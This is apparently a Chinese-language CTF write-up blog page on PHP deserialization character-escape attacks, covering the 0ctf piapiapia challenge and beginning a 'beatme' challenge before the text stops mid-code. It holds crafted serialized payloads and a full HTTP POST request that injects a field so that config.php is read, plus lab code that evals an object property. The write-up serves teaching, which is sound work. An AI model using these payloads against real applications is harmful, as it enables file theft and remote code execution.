@@ -1,0 +1,1399 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>php 反序列化字符逃逸 - DumKiy's blog</title>
+
+<meta name="description" content="反序列化字符逃逸反序列化造成的字符逃逸或者对象注入问题的原因在于序列化后的内容长度被修改,而 php 在反序列化时只会根据字段的长度去进行解析, 从而导致反序列化后出现问题.序列化内容由短变长最经典的题目是 0ctf piapiapia ,buuctf 平台上可以直接开启环境.题目的场景如下:  提供了注册接口 ...">
+<link rel="canonical" href="http://localhost:4000/php/2023/06/08/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>php 反序列化字符逃逸</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2023-06-07-php-反序列化字符逃逸.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="php 反序列化字符逃逸"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=Deserialization">Deserialization</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Jun 08, 2023</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2023-06-08T06:06:45+08:00">
+    <meta itemprop="keywords" content="Deserialization"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h1 id="反序列化字符逃逸">反序列化字符逃逸</h1>
+<p>反序列化造成的字符逃逸或者对象注入问题的原因在于序列化后的内容长度被修改,而 php 在反序列化时只会根据字段的长度去进行解析, 从而导致反序列化后出现问题.</p>
+
+<h2 id="序列化内容由短变长">序列化内容由短变长</h2>
+
+<p>最经典的题目是 0ctf piapiapia ,buuctf 平台上可以直接开启环境.</p>
+
+<p>题目的场景如下:</p>
+<ol>
+  <li>提供了注册接口 register.php 以及登陆接口 login.php</li>
+  <li>登陆之后可以在 update.php 中修改用户信息.
+修改后的用户信息首先会被进行序列化
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$user</span><span class="o">-&gt;</span><span class="nf">update_profile</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$profile</span><span class="p">));</span>
+</code></pre></div>    </div>
+    <p>序列化内容中的 <code class="language-plaintext highlighter-rouge">'select', 'insert', 'update', 'delete', 'where'</code> 会被替换为 hacker,</p>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="k">public</span> <span class="k">function</span> <span class="n">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+     <span class="nv">$escape</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'\''</span><span class="p">,</span> <span class="s1">'\\\\'</span><span class="p">);</span>
+     <span class="nv">$escape</span> <span class="o">=</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$escape</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'/'</span><span class="p">;</span>
+     <span class="nv">$string</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$escape</span><span class="p">,</span> <span class="s1">'_'</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+
+     <span class="nv">$safe</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'select'</span><span class="p">,</span> <span class="s1">'insert'</span><span class="p">,</span> <span class="s1">'update'</span><span class="p">,</span> <span class="s1">'delete'</span><span class="p">,</span> <span class="s1">'where'</span><span class="p">);</span>
+     <span class="nv">$safe</span> <span class="o">=</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$safe</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'/i'</span><span class="p">;</span>
+     <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$safe</span><span class="p">,</span> <span class="s1">'hacker'</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+ <span class="p">}</span>
+</code></pre></div>    </div>
+    <p>过滤之后的内容会存放在数据库中.</p>
+  </li>
+  <li>更新完了之后会跳转到 profile.php 中查看用户信息. 
+ profile.php 会将序列化的用户信息从数据库中取出,然后进行反序列化, 会对其中的 <code class="language-plaintext highlighter-rouge">$photo</code> 属性调用 file_get_contents.
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$profile</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$profile</span><span class="p">);</span>
+ <span class="nv">$phone</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s1">'phone'</span><span class="p">];</span>
+ <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s1">'email'</span><span class="p">];</span>
+ <span class="nv">$nickname</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s1">'nickname'</span><span class="p">];</span>
+ <span class="nv">$photo</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$profile</span><span class="p">[</span><span class="s1">'photo'</span><span class="p">]));</span>
+</code></pre></div>    </div>
+    <p>只要能够控制 <code class="language-plaintext highlighter-rouge">$photo</code> 的值, 那么就可以利用 file_get_contents 读取 config.php 中的 flag.</p>
+  </li>
+</ol>
+
+<p>一个正常的 profile, 序列化之后的内容如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$profile</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+    <span class="s1">'phone'</span><span class="o">=&gt;</span><span class="s2">"12345678912"</span><span class="p">,</span>
+    <span class="s2">"email"</span><span class="o">=&gt;</span><span class="s2">"123@qq.com"</span><span class="p">,</span>
+    <span class="s2">"nickname"</span><span class="o">=&gt;</span><span class="s2">"admin"</span><span class="p">,</span>
+    <span class="s2">"photo"</span><span class="o">=&gt;</span><span class="s2">"upload//123123123.png"</span>
+<span class="p">);</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$profile</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$a</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="c1">// a:4:{s:5:"phone";s:11:"12345678912";s:5:"email";s:10:"123@qq.com";s:8:"nickname";s:5:"admin";s:5:"photo";s:21:"upload//123123123.png";}</span>
+</code></pre></div></div>
+<p>filter 函数中会将 where 替换为 hacker ,此时长度会扩增一位, 利用长度变化就可以达成对象注入的目的. 我们的目标是注入 photo 属性, 并设置为 config.php, 所以需要在 nickname 处构造 payload, 对应的序列化字符串为:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a:4:{s:5:"phone";s:11:"12345678912";s:5:"email";s:10:"123@qq.com";s:8:"nickname";s:5:"admin";s:5:"photo";s:10:"config.php";}
+</code></pre></div></div>
+<p>nickname 需要注入的内容为 <code class="language-plaintext highlighter-rouge">";s:5:"photo";s:10:"config.php";}</code> 这其中会带有引号, 题目对 nickname 使用了 pregmatch 进行过滤,.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[^a-zA-Z0-9_]/'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'nickname'</span><span class="p">])</span> <span class="o">||</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'nickname'</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">'Invalid nickname'</span><span class="p">);</span>
+</code></pre></div></div>
+<p>为了绕过过滤, nickname 可以传一个数组.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$profile</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+    <span class="s1">'phone'</span><span class="o">=&gt;</span><span class="s2">"12345678912"</span><span class="p">,</span>
+    <span class="s2">"email"</span><span class="o">=&gt;</span><span class="s2">"123@qq.com"</span><span class="p">,</span>
+    <span class="s2">"nickname"</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="o">=&gt;</span><span class="s2">"admin"</span><span class="p">),</span>
+    <span class="s2">"photo"</span><span class="o">=&gt;</span><span class="s2">"config.php"</span>
+<span class="p">);</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$profile</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$a</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="c1">// a:4:{s:5:"phone";s:11:"12345678912";s:5:"email";s:10:"123@qq.com";s:8:"nickname";a:1:{i:0;s:5:"admin";}s:5:"photo";s:10:"config.php";}</span>
+</code></pre></div></div>
+<p>nickname 需要注入的内容为 <code class="language-plaintext highlighter-rouge">";}s:5:"photo";s:10:"config.php";}</code>, 一共 34 个字符, 将一个 where 替换成 hacker 会增长一位, 所以需要构造 34 个 where.
+payload 如下, 其中的 filter 为题目的 filter 函数.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$profile</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+    <span class="s1">'phone'</span><span class="o">=&gt;</span><span class="s2">"12345678912"</span><span class="p">,</span>
+    <span class="s2">"email"</span><span class="o">=&gt;</span><span class="s2">"123@qq.com"</span><span class="p">,</span>
+    <span class="s2">"nickname"</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="o">=&gt;</span><span class="s1">'wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}'</span><span class="p">),</span>
+    <span class="s2">"photo"</span><span class="o">=&gt;</span><span class="s2">"config.php"</span>
+<span class="p">);</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$profile</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$a</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="c1">// a:4:{s:5:"phone";s:11:"12345678912";s:5:"email";s:10:"123@qq.com";s:8:"nickname";a:1:{i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:10:"config.php";}</span>
+
+<span class="nv">$b</span> <span class="o">=</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$b</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$c</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+<span class="cm">/*
+array(4) {
+  'phone' =&gt;
+  string(11) "12345678912"
+  'email' =&gt;
+  string(10) "123@qq.com"
+  'nickname' =&gt;
+  array(1) {
+    [0] =&gt;
+    string(204) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"
+  }
+  'photo' =&gt;
+  string(10) "config.php"
+}
+*/</span>
+</code></pre></div></div>
+<p>可以看到成功注入了 photo 字段. 访问 update 页面, 发包时将 nickname 改为数组的形式:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/update.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">fe5856ed-f492-4f4b-ba4f-fd34c09ed30e.node4.buuoj.cn:81</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">42204</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://fe5856ed-f492-4f4b-ba4f-fd34c09ed30e.node4.buuoj.cn:81</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=----WebKitFormBoundaryZN7nsGI9VfzzoC75</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://fe5856ed-f492-4f4b-ba4f-fd34c09ed30e.node4.buuoj.cn:81/update.php</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=5f0e93753e1bd5fcfa584e4d9aaa9f40</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+------WebKitFormBoundaryZN7nsGI9VfzzoC75
+Content-Disposition: form-data; name="phone"
+
+12345678912
+------WebKitFormBoundaryZN7nsGI9VfzzoC75
+Content-Disposition: form-data; name="email"
+
+123@qq.com
+------WebKitFormBoundaryZN7nsGI9VfzzoC75
+Content-Disposition: form-data; name="nickname[]"
+
+wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
+</code></pre></div></div>
+<p>再次访问 profile.php 就可以拿到 config.php 的内容.</p>
+
+<h2 id="序列化内容由长变短">序列化内容由长变短</h2>
+
+<p>例题: beatme
+index.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="n">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$escape</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'\''</span><span class="p">,</span> <span class="s1">'\\\\'</span><span class="p">);</span>
+    <span class="nv">$escape</span> <span class="o">=</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$escape</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'/'</span><span class="p">;</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$escape</span><span class="p">,</span> <span class="s1">'_'</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+
+    <span class="nv">$safe</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'select'</span><span class="p">,</span> <span class="s1">'insert'</span><span class="p">,</span> <span class="s1">'update'</span><span class="p">,</span> <span class="s1">'delete'</span><span class="p">,</span> <span class="s1">'where'</span><span class="p">);</span>
+    <span class="nv">$safe</span> <span class="o">=</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$safe</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'/i'</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$safe</span><span class="p">,</span> <span class="s1">'nono'</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">Challenge</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$key</span><span class="p">;</span>
+    <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$p1</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span><span class="nv">$p2</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span><span class="nv">$key</span><span class="o">=</span><span class="s2">"echo 'can you beat me?';"</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">p1</span> <span class="o">=</span> <span class="nv">$p1</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">p2</span> <span class="o">=</span> <span class="nv">$p2</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="nv">$key</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">__destruct</span><span class="p">(){</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'p'</span><span class="p">])){</span>
+    <span class="nv">$raw</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">Challenge</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'p1'</span><span class="p">],</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'p2'</span><span class="p">]));</span>
+    <span class="nv">$safe</span> <span class="o">=</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$raw</span><span class="p">);</span>
+    <span class="nv">$a</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$safe</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Challenge</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<ol>
+  <li>参数 p1,p2 可以传入两个参数用于实例化 Challenge 对象, Challenge 对象在销毁时会执行 eval, key 属性的内容无无法直接通过传参来控制</li>
+  <li>调用 filter 函数处理序列化的内容, 但与 0ctf piapiapia 不同的地方在于这道题是由长变短, 从 where 替换为 nono 时会减少一个字符.</li>
+</ol>
+
+<p>我们的目标是通过反序列化逃逸注入 key 属性,但与 0ctf piapiapia 不同的是, 由短变长时,一般控制目标的前一个字段,而由长变短时,就需要同时控制前两个字段, 这里为 p1 和 p2.</p>
+
+<p>我们想要构造的目标为:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">Challenge</span><span class="p">{</span>
